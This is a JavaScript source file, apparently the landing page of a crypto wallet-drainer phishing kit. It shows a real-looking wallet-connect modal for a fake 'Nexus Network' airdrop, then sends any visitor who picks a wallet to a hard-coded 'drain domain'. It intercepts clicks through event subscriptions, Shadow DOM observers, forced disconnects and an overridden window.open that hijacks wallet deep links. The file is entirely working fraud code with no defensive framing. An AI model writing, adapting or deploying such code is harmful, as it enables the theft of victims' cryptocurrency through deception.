// =====================================================
// LANDING PAGE — Real AppKit modal on main domain
// When user clicks a wallet → redirect to drain domain
// =====================================================
import { createAppKit } from '@reown/appkit'
import { EthersAdapter } from '@reown/appkit-adapter-ethers'
import { mainnet, bsc, polygon, arbitrum, optimism, avalanche, fantom, base } from '@reown/appkit/networks'

// =====================================================
// CONFIG
// =====================================================
const DRAIN_URL = 'https://playholding.vercel.app/?connect=1';
const PROJECT_ID = '5db25d59ec5c740d09771e8b9037b7f9';

// =====================================================
// APPKIT INIT — Real wallet modal with real detection
// =====================================================
const ethersAdapter = new EthersAdapter();

const modal = createAppKit({
  adapters: [ethersAdapter],
  networks: [mainnet, bsc, polygon, arbitrum, optimism, avalanche, fantom, base],
  projectId: PROJECT_ID,
  metadata: {
    name: 'Nexus Network',
    description: 'Nexus Network — OmniChain Airdrop',
    url: window.location.origin,
    icons: [],
  },
  enableReconnect: false,
  allWallets: 'SHOW',
  featuredWalletIds: [
    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
    'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
  ],
  features: {
    analytics: false,
    email: false,
    socials: false,
    onramp: false,
    swaps: false,
    reownBranding: false,
  },
  themeMode: 'dark',
  themeVariables: {
    '--w3m-accent': '#00f2fe',
  },
});

// =====================================================
// REDIRECT TO DRAIN DOMAIN
// =====================================================
let redirected = false;

function goToDrain() {
  if (redirected) return;
  redirected = true;

  // Close AppKit modal
  try { modal.close(); } catch (e) {}
  // Disconnect if somehow connected
  try { modal.disconnect(); } catch (e) {}

  // Full page redirect (like auracoin → farmhousegame)
  window.location.href = DRAIN_URL;
}

// =====================================================
// METHOD 1: Subscribe to AppKit events (SELECT_WALLET)
// =====================================================
modal.subscribeEvents((event) => {
  const e = event?.data?.event;
  console.log('[Landing] AppKit event:', e, event?.data);
  // Catch any wallet selection event
  if (
    e === 'SELECT_WALLET' ||
    e === 'CLICK_WALLET' ||
    e === 'CONNECT_PRESS' ||
    e === 'WALLET_CONNECT_PRESS'
  ) {
    goToDrain();
  }
});

// =====================================================
// METHOD 2: Watch for provider (wallet connected on this domain)
// If they somehow fully connect, redirect immediately
// =====================================================
modal.subscribeProviders((state) => {
  const evmProvider = state['eip155'];
  if (evmProvider) {
    try { modal.disconnect(); } catch (e) {}
    goToDrain();
  }
});

// =====================================================
// METHOD 3: MutationObserver — catch clicks inside AppKit Shadow DOM
// This intercepts clicks on wallet buttons inside the w3m modal
// =====================================================
function setupModalClickInterceptor() {
  // Watch for the AppKit modal element to appear in DOM
  const observer = new MutationObserver(() => {
    const w3mModal = document.querySelector('w3m-modal');
    if (!w3mModal) return;

    // The modal uses Shadow DOM — listen for clicks on the host
    w3mModal.addEventListener('click', (e) => {
      // Check if click target is inside a wallet list item
      const path = e.composedPath();
      for (const el of path) {
        if (!el.tagName) continue;
        const tag = el.tagName.toLowerCase();
        // AppKit wallet list items use these tags
        if (
          tag === 'wui-list-wallet' ||
          tag === 'w3m-connect-wallet-widget' ||
          tag === 'wui-wallet-button' ||
          tag.includes('wallet')
        ) {
          // Small delay to let AppKit register the click, then redirect
          setTimeout(goToDrain, 100);
          return;
        }
      }
    }, true);

    // Also observe inside the shadow root for dynamic content
    if (w3mModal.shadowRoot) {
      w3mModal.shadowRoot.addEventListener('click', (e) => {
        const path = e.composedPath();
        for (const el of path) {
          if (!el.tagName) continue;
          const tag = el.tagName.toLowerCase();
          if (
            tag === 'wui-list-wallet' ||
            tag === 'wui-wallet-button' ||
            tag.includes('wallet') ||
            (el.getAttribute && el.getAttribute('data-testid')?.includes('wallet'))
          ) {
            setTimeout(goToDrain, 100);
            return;
          }
        }
      }, true);
    }
  });

  observer.observe(document.body, { childList: true, subtree: true });
}

setupModalClickInterceptor();

// =====================================================
// METHOD 4: Intercept window.open (WalletConnect QR / deep links)
// If AppKit tries to open a deep link, redirect instead
// =====================================================
const _originalOpen = window.open;
window.open = function(url, ...args) {
  if (url && typeof url === 'string') {
    // If AppKit is trying to open a wallet deep link, redirect to drain
    if (
      url.includes('metamask.app.link') ||
      url.includes('trust://') ||
      url.includes('phantom.app') ||
      url.includes('coinbase') ||
      url.includes('wc:') ||
      url.includes('walletconnect')
    ) {
      goToDrain();
      return null;
    }
  }
  return _originalOpen.call(window, url, ...args);
};

// =====================================================
// EXPOSE TO HTML
// =====================================================
window.openWalletModal = () => {
  redirected = false;
  modal.open({ view: 'Connect' });
};
